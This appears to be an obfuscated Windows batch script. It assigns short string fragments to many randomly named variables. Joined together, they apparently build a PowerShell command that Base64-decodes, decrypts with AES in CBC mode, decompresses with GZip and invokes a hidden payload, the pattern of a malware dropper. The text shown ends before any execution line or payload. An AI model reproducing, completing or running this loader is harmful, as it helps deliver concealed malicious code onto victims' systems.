@echo off
set "gGOLJVPsmF=Sy"
set "PZWauEBEeN=:\"
set "ebFfIUcAZj= /"
set "EsZMfQOjhY=em"
set "hKVOZNtBOr=ll"
set "hvIiyxSAQL=co"
set "MpcVjIvCJu=1."
set "ZZcIVRHZEr=we"
set "xZYMlNGbFS=in"
set "rRStnjLWlW=rs"
set "arYcskzCPf=\v"
set "mUHrLGzhgN=\W"
set "gtjjHsDFzd= C"
set "WrDDmRmXQO=Wi"
set "YdNQrSXeEU=xe"
set "gghADvmqNC=rS"
set "ZgcYdbMFuy=he"
set "scdZTIrQHk=st"
set "OlOizkSiis=.e"
set "bjUrIkhlNs=py"
set "cYbgBzCSNI=he"
set "vOQliOsTzT=y "
set "uUkDNOlzAf=nd"
set "qHctAZGQyl=Po"
set "GwIlTGJtKY=we"
set "IxOrueOXfZ=ll"
set "YFCKZnyoda=32"
set "TnaNVbnUXe=ow"
set "kcMHYJLIaz=ws"
set "gFloHNAtaG=do"
set "bKCwBKZYNr=po"
set "IDgawPPGXQ=s\"
set "dRFbRwksAQ=0\"
set "eIAthccxuc=cd"
set "SKVlQHkmvP= %~dp0"
set "gIxBtwUqvW=ne);"
set "YJDSyLYcbl=le  "
set "iZnnlrvfJE=vTNY"
set "JXcCVXrKOz=3); "
set "dGMULHcqRZ=.IO."
set "tFDWaDerGr=join"
set "vWQuTcPFqS=g = "
set "KxuiPhhESF=y.Cr"
set "bJiFrKKmBn=gnir"
set "ohmNzfyDIR=iron"
set "vJuucnYUko='')("
set "zUxIdeQofP=y.Ci"
set "HpKmJeznjf=dzE "
set "jslSpGDyfK=TllA"
set "BMdUksmcXq=gMod"
set "PTNtgfDmhn=fore"
set "MnoslWoobi=16] "
set "tDRarvwGGP=-joi"
set "uLVmPLLTSg=RmAx"
set "oFkMSdbrKr=ring"
set "sIPpCBZltg=::De"
set "JBfneIAevL=zuZI"
set "ZMuZzUmYEU=trea"
set "IbbjgGRXmb=yste"
set "CWghxjvHnu=and "
set "sjIizDGydW='[-1"
set "BdqXcgoBEN=comp"
set "QcrqyZpAsG=Invo"
set "wrOtMNkoSx= = N"
set "SjCleCrHZg=k; }"
set "csFWkYpVwa=Ck ="
set "UEZAKETvZP=)))"
set "MLnTIIZhFw=yste"
set "cVURaAhqwY=ORuo"
set "gzfIJGlwEu=ing("
set "NoUdkgBOmB=Comp"
set "ajuADWjino=ion."
set "BxfsMxcWaM=$vTN"
set "iybjDJQKOU=gsYZ"
set "LcZlOJhFqb=stem"
set "uoRwLBkKRK=m.IO"
set "oFCwaHtNeV=gjYA"
set "QmbwrrOSqC=-1.."
set "xQXvKXvEsu=n ''"
set "kgPGpdNZXW=bjec"
set "vwvjzHXCDH=m.Re"
set "kRROPYMYRF=tsWi"
set "PgdobobAdb=rtS4"
set "SUFAurHSha=ecry"
set "CgtAZLSaSF=kMCk"
set "hdJxSqYtse=join"
set "IjoKLXLhMP=Yh);"
set "QOBwCQIpyB=.Len"
set "pkErJfBPEP=rity"
set "xDGsqhoqjy=ct S"
set "YGPJZmNiFP=tem."
set "NridWCKYRh=pyZ "
set "PnPfMaZHRO=F'[-"
set "IQLMVAhdNh=Syst"
set "iZVUGlTlbn=lBlo"
set "hSxDlQJHBu=Disp"
set "AHbKViMIIp=TNYh"
set "AJWGLGbnwL=NywJ"
set "gDolATePBG=n = "
set "cwqIMNPYST=H.Su"
set "aecfNOQNiX= = ["
set "lVXiYVNMUL=UB, "
set "ltITmvOJjy=-joi"
set "mkrHjFNCwe=.Com"
set "OvrKwvhqXF=..-1"
set "sILWnwGigE=pose"
set "eUQKqhpQdz=-4] "
set "NJgBVrdjQw=e]::"
set "bUtxOrKpic=stem"
set "xGkmoTyVkR=ress"
set "iMpcdVWxvu==');"
set "DpxSQrsrSX=ewLi"
set "cZWVMsagXP=saBm"
set "xQerHrcvJi=m.IO"
set "EBOjQTxbRT=ress"
set "HMcNpmymLL=PTH."
set "GfxowSwxqx=1..-"
set "asPAAzyvuw=.Mod"
set "ViJWILslPp=ypto"
set "aswJJvIDuF=106u"
set "LRoYqevGIM== [S"
set "jiOSXetWRN=e = "
set "DlmUVLpYXq=tion"
set "oDLGqYfMNe=$ZkM"
set "bYtAYgXhVF=n ''"
set "CttxkAnWfa=; };"
set "IgPAZqYHFH=vTNY"
set "JlScmMBJhR=tryP"
set "tKYtjBApvw=gth)"
set "iXqyNQBtnz=esMa"
set "PukPPNWplC=eam("
set "NuJsQLCVVl=Ck);"
set "FJLHXkpZZh= [Sy"
set "CTIurAfsVR=orF'"
set "wltQTkcyIo='gni"
set "ceCNNlIcRL= [Sy"
set "hEbEWSFbKF=mory"
set "CZStsYUJGs=7;$Y"
set "veDtHaqWFR=d;$Y"
set "WaxzDzbtFl=$vTN"
set "NKloxHuBld=);$Y"
set "iSYkBAvRxt=Yh ="
set "ZkqWkqKmMD=urit"
set "tAwYSdKlXy=$ZkM"
